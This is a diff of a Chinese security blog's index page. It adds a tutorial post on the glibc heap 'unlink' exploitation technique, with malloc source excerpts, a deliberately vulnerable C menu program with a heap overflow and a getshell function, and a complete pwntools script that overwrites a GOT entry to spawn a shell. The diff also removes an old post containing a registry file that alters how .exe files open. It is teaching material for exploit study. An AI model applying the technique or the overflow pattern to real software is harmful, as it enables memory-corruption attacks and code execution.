@@ -67,6 +67,70 @@
       <div id="main" class="wrapper">
         <div id="primary" class="site-content"><div id="content" role="main">
   
+    <article id="post-pwn-unlink" class="post-pwn-unlink post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2018/07/25/pwn-unlink/">pwn-unlink</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/25/pwn-unlink/" data-id="cjk0lq5n5000f413kqmfw1zm1" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>没有什么比看源码更能清楚程序执行逻辑的了！</p>
+<p>unlink能够实现任意修改指针的值，然后对地址内的数据进行修改。unlink在free函数调用时发生，在glibc源码_libc_free以及_int_free两个函数就是free函数调用时执行的代码，选择部分关键源代码解释unlink:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">	unlink(av, nextchunk, bck, fwd);</span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+<p>通过源代码，后向合并是向低地址合并，首先是size+=presize，接着p指针移到后一个chunk，进行unlink。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);			      \</span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">      malloc_printerr (<span class="string">"corrupted double-linked list"</span>);			      \</span><br><span class="line">    <span class="keyword">else</span> &#123;								      \</span><br><span class="line">        FD-&gt;bk = BK;							      \</span><br><span class="line">        BK-&gt;fd = FD;							      \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))			      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      \</span><br><span class="line">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      \</span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">	      malloc_printerr (<span class="string">"corrupted double-linked list (not small)"</span>);   \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				      \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">                <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                  &#125;							      \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">              &#125;								      \</span><br><span class="line">          &#125;								      \</span><br><span class="line">      &#125;									      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>unlink如果要执行FD-&gt;bk = BK;BK-&gt;fd = FD;那么要通过两个校验，一个是当前chunk与前向chunk的prev_size要相等，另一个即是FD-&gt;bk != P || BK-&gt;fd != P的校验，那么构造方法即是：</p>
+<ol>
+<li>malloc(size)大小的chunk，内容随意，</li>
+<li>malloc(size)大小的chunk，内容随意</li>
+<li>对第一个chunk写入fake_presize，fake_size，fake_fd，fake_bk，以及填充第一个chunk的数据，溢出覆盖第二个chunk的presize和size，构造presize == chunksize(P)，同时第二个chunk的size最低位置0</li>
+<li>free第二个chunk</li>
+</ol>
+<p>最终实现改写*(fake_bk+8(16)) = fake_fd，接下来就是任意写指针，最后任意写地址处数据。</p>
+<p>下面是测试Unlink作用的一个小程序，只需unlink即可获取shell:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//unlink_test.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *buf[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"Wellcome To the Heap World\n"</span>,<span class="number">0x1B</span>);</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"1. Create\n"</span>,<span class="number">0xA</span>);</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"2. Delete\n"</span>,<span class="number">0xA</span>);</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"3. Update\n"</span>,<span class="number">0xA</span>);</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"4. Exit\n"</span>,<span class="number">0x8</span>);</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"Your choice :"</span>,<span class="number">0xD</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">	read(<span class="number">0</span>,&amp;buf,<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> result = atoi(&amp;buf);</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Create</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> nbytes,i=<span class="number">0</span>;</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"Size: "</span>,<span class="number">6</span>);</span><br><span class="line">	nbytes = input();</span><br><span class="line">	<span class="keyword">char</span> *p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nbytes);</span><br><span class="line">	<span class="keyword">if</span>(p)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span>(buf[i] &amp;&amp; i &lt;= <span class="number">9</span>)	i++;</span><br><span class="line">		<span class="keyword">if</span> (i == <span class="number">10</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			write(<span class="number">1</span>,<span class="string">"List is Full!\n"</span>,<span class="number">0xE</span>);</span><br><span class="line">			<span class="built_in">free</span>(p);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			write(<span class="number">1</span>,<span class="string">"Data: "</span>,<span class="number">0x6</span>);</span><br><span class="line">			read(<span class="number">0</span>,p,nbytes);</span><br><span class="line">			buf[i] = p;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"Index: "</span>,<span class="number">0x7</span>);</span><br><span class="line">	<span class="keyword">int</span> idx = input();</span><br><span class="line">	<span class="keyword">if</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)idx &lt;= <span class="number">9</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">free</span>(buf[idx]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Update</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"Index: "</span>,<span class="number">0x7</span>);</span><br><span class="line">	<span class="keyword">int</span> idx = input();</span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)idx &lt;= <span class="number">9</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(buf[idx])</span><br><span class="line">		&#123;</span><br><span class="line">			write(<span class="number">1</span>,<span class="string">"Size: "</span>,<span class="number">0x6</span>);</span><br><span class="line">			<span class="keyword">int</span> nbytes = input();</span><br><span class="line">			write(<span class="number">1</span>,<span class="string">"Data: "</span>,<span class="number">0x6</span>);</span><br><span class="line">			read(<span class="number">0</span>,buf[idx],nbytes); <span class="comment">//overflow</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> choice;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		Menu();</span><br><span class="line">		choice = input();</span><br><span class="line">		<span class="keyword">switch</span>(choice)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				Create();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				Delete();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				Update();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				write(<span class="number">1</span>,<span class="string">"Wrong choice\n"</span>,<span class="number">0xD</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>gcc unlink_test.c -o unlink_test</p>
+<p>生成的程序默认开启NX，Canary以及Partial RELRO，能够通过写got表，实现getshell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Update</span><span class="params">(idx,size,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Data: "</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create</span><span class="params">(size,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Data: "</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exitProcess</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./unlink_test"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">Create(<span class="number">0x80</span>,<span class="string">"A"</span>*<span class="number">16</span>)</span><br><span class="line">Create(<span class="number">0x80</span>,<span class="string">"B"</span>*<span class="number">16</span>)</span><br><span class="line">payload1 = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) + p64(<span class="number">0x6010A0</span><span class="number">-0x18</span>) + p64(<span class="number">0x6010A0</span><span class="number">-0x10</span>) + <span class="string">"A"</span>*<span class="number">0x60</span> + p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">Update(<span class="number">0</span>,len(payload1),payload1)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x601058</span>)</span><br><span class="line">Update(<span class="number">0</span>,len(payload2),payload2)</span><br><span class="line">payload3 = p64(<span class="number">0x4009D4</span>)</span><br><span class="line">Update(<span class="number">0</span>,len(payload3),payload3)</span><br><span class="line"></span><br><span class="line">exitProcess()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2018/07/25/pwn-unlink/">
+    <time datetime="2018-07-25T04:00:33.589Z" class="entry-date">
+        2018-07-25
+    </time>
+</a>
+    
+  <span class="article-delim">&#8226;</span>
+  <div class="article-category">
+  <a class="article-category-link" href="/categories/pwn/">pwn</a>
+  </div>
+
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
     <article id="post-QCTF-xman" class="post-QCTF-xman post type-post status-publish format-standard hentry">
     <!---->
 
@@ -82,7 +146,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/16/QCTF-xman/" data-id="cjjnztsds0004783k28dghv2l" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/16/QCTF-xman/" data-id="cjk0lq5n0000a413k6v33e388" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -150,7 +214,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/11/WCTF2018/" data-id="cjjnztse2000b783kytupwd0f" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/11/WCTF2018/" data-id="cjk0lq5n3000b413k96dgrf8j" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -211,7 +275,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/05/29/setUnhandleExceptionFilter-exploration/" data-id="cjjnztsey000z783ki57z1qaw" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/05/29/setUnhandleExceptionFilter-exploration/" data-id="cjk0lq5nl000x413kjl46artz" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -298,7 +362,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/04/13/HITBCTF2018-reverse-hex/" data-id="cjjnztsdz000a783kr9dqb3n2" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/04/13/HITBCTF2018-reverse-hex/" data-id="cjk0lq5my0006413kv680q9lw" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -365,7 +429,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/03/20/Play-Rtsp-Stream-opencv2/" data-id="cjjnztsdw0006783krl8rcnxx" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/03/20/Play-Rtsp-Stream-opencv2/" data-id="cjk0lq5mw0005413kcgrhgxdd" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -417,7 +481,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/01/16/Mi-4C动态调试so库/" data-id="cjjnztsdm0001783kw2rrrrf6" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/01/16/Mi-4C动态调试so库/" data-id="cjk0lq5mo0001413ks1zwtv2m" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -471,7 +535,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/12/28/qemu环境搭建/" data-id="cjjnztser000p783kweotw0q8" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/12/28/qemu环境搭建/" data-id="cjk0lq5ni000p413kja1g4jou" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -569,7 +633,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/11/12/hctf2017-level1Tolevel3-reverse/" data-id="cjjnztsmj002h783kduauf0vu" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/11/12/hctf2017-level1Tolevel3-reverse/" data-id="cjk0lq5ov002l413k0ban0q7h" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -652,7 +716,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/10/26/getKernel32/" data-id="cjjnztse8000i783kzqebugdf" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/10/26/getKernel32/" data-id="cjk0lq5nf000m413k3i6rjzsz" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -691,56 +755,6 @@
 
 
   
-    <article id="post-改错注册表之后。。。" class="post-改错注册表之后。。。 post type-post status-publish format-standard hentry">
-    <!---->
-
-      <header class="entry-header">
-        
-        
-  
-    <h1 class="entry-title">
-      <a class="article-title" href="/2017/10/20/改错注册表之后。。。/">改错注册表之后。。。</a>
-    </h1>
-  
-
-        
-        <div class="comments-link">
-            
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/10/20/改错注册表之后。。。/" data-id="cjjnztsfd001a783ken8d0ong" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
-        </div><!-- .comments-link -->
-      </header><!-- .entry-header -->
-
-    <div class="entry-content">
-      
-        <p>emmmmmmmm……经过一些骚操作，我改错了注册表，导致exe程序只能右键管理员运行，还是无意中发现的，修复了文件关联，发现没用。</p>
-<h2 id="文件关联"><a href="#文件关联" class="headerlink" title="文件关联"></a>文件关联</h2><p>写下如下代码，改后缀为reg，双击运行，修改hkey_classes_root\exefile\shell\open\command键值，可以自己尝试修改为其他键值，会有惊喜！</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">REGEDIT4</span><br><span class="line"></span><br><span class="line">[hkey_classes_root\.exe]</span><br><span class="line"></span><br><span class="line">@=<span class="string">"exefile"</span></span><br><span class="line"></span><br><span class="line">[hkey_classes_root\exefile\shell\open\command]</span><br><span class="line"></span><br><span class="line">@=<span class="string">"%1"</span> %*</span><br></pre></td></tr></table></figure>
-<h2 id="真正原因"><a href="#真正原因" class="headerlink" title="真正原因"></a>真正原因</h2><p>晚上已经绝望到是否要重装了，突然发现我修改错了键值，修改了hkey_classes_root\evtxfile\Shell\open\command，将键值改回原样，系统恢复正常，百度发现还没有evtxfile键值的相关说明，只是command键值里面相关的eventvwr.exe似乎与windows加载有关系，emmmmmm，有待研究。</p>
-<p>总之，电脑总算恢复正常啦！然而，厄运并没有结束。。。早晨，手机莫名被锁。。。怎一个愁字了得！</p>
-
-      
-    </div><!-- .entry-content -->
-
-    <footer class="entry-meta">
-    <a href="/2017/10/20/改错注册表之后。。。/">
-    <time datetime="2017-10-20T04:29:57.000Z" class="entry-date">
-        2017-10-20
-    </time>
-</a>
-    
-    
-  <span class="article-delim">&#8226;</span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/杂谈/">杂谈</a></li></ul>
-
-    </footer>
-</article>
-
-
-
-
-
-
-  
   
     <nav id="pagination">
       <nav id="page-nav">
@@ -765,7 +779,7 @@
   <aside class="widget">
     <h3 class="widget-title">Categories</h3>
     <div class="widget-content">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Python/">Python</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/XCTF2018/">XCTF2018</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hctf/">hctf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a><span class="category-list-count">6</span></li></ul>
